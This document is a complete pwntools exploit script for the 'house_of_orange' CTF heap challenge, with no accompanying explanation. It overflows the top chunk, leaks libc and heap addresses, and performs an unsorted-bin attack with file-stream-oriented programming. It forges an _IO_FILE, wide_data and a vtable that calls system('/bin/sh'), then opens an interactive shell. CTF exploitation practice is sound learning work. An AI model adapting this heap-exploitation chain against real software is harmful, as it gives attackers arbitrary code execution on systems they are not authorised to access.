from pwn import *

os.environ['LD_PRELOAD'] = './libc.so.6'
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = process('./house_of_orange')

def new(name, price=0, color=0xddaa, l=None):
    if not l:
        l = len(name)
    r.sendlineafter('Your choice : ', '1')
    r.sendlineafter('Length of name :', str(l))
    r.sendafter('Name :', name)
    r.sendlineafter('Price of Orange:', str(price))
    r.sendlineafter('Color of Orange:', str(color))

def see():
    r.sendlineafter('Your choice : ', '2')

def upgrade(name, price=0, color=0xddaa, l=None):
    if not l:
        l = len(name)
    r.sendlineafter('Your choice : ', '3')
    r.sendlineafter('Length of name :', str(l))
    r.sendafter('Name:', name)
    r.sendlineafter('Price of Orange:', str(price))
    r.sendlineafter('Color of Orange:', str(color))

new('A'*0x8c8)
upgrade('A'*0x8c8+p64(0x21)+p32(0)+p32(0xddaa)+'\x00'*0x10+p64(0x6f1))
new('A'*0xf78)

# leak libc
new('A'*0x8, l=0x600)
see()
r.recvuntil('A'*0x8)
libc_base = u64(r.recv(6)+'\x00\x00') - libc.symbols['__malloc_hook'] - 0x4e8
system = libc_base + libc.symbols['system']
log.info('libc base: %#x' % libc_base)

# libc heap addr
upgrade('A'*0x18, 0x400)
see()
r.recvuntil('A'*0x18)
heap_base = u64(r.recv(6)+'\x00\x00') - 0x970
log.info('heap base: %#x' % heap_base)

# unsorted bin attack && fsop
_IO_list_all = libc_base + libc.symbols['_IO_list_all']
log.info('_IO_list_all: %#x' % _IO_list_all)

vtable_addr = heap_base + 0x10a8
fake_wide_data = vtable_addr - 0x30

stream = '/bin/sh\x00'+p64(0x61)
stream += p64(0)+p64(_IO_list_all-0x10)
stream = stream.ljust(0xa0,"\x00")
stream += p64(fake_wide_data)
stream = stream.ljust(0xc0,"\x00")
stream += p64(1)+p64(0)*2
stream += p64(vtable_addr)

padding = 'A'*0x600+p64(0)+p64(0x21)+p32(0)+p32(0xddaa)+p64(0)

# fake wide_data
wide_data = p64(0)*3+p64(1)

# fake vtable
vtable = p64(0)*4+p64(system)

upgrade(padding+stream+wide_data+vtable)

r.sendlineafter('Your choice : ', '1')
r.clean()

r.interactive()
